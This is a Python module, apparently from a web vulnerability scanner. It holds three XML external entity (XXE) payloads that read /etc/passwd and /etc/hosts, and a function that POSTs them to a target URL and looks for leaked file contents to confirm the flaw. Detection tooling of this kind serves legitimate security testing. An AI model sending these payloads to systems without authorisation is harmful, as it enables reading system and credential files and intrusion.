XXE_PAYLOADS = [
    {
        "name": "basic_xxe_passwd",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "indicators": ["root:", "daemon:", "nobody:"],
    },
    {
        "name": "basic_xxe_hosts",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        "indicators": ["127.0.0.1", "localhost"],
    },
    {
        "name": "blind_xxe",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root>test</root>',
        "indicators": ["root:", "daemon:", "nobody:"],
    },
]


def xxe_check(engine):
    engine._log("INFO", f"Starting XXE detection on {engine.target_url}")
    results = []

    for entry in XXE_PAYLOADS:
        resp = engine.request(method="POST", data=entry["payload"])
        if resp is None:
            continue

        resp_text = resp.text
        indicators = [i for i in entry["indicators"] if i in resp_text]

        if indicators:
            engine._log("VULN", f"XXE confirmed via {entry['name']}")
            engine._log("VULN", f"  File content indicators: {indicators}")
            results.append({
                "check": entry["name"],
                "detail": f"XXE confirmed — file content leaked: {indicators}",
                "indicators": indicators,
                "status": resp.status_code,
                "severity": "critical",
            })
            break

    engine.results["xxe"] = results
    engine._log("INFO", f"XXE detection complete. Confirmed: {len(results)}.")
    return results
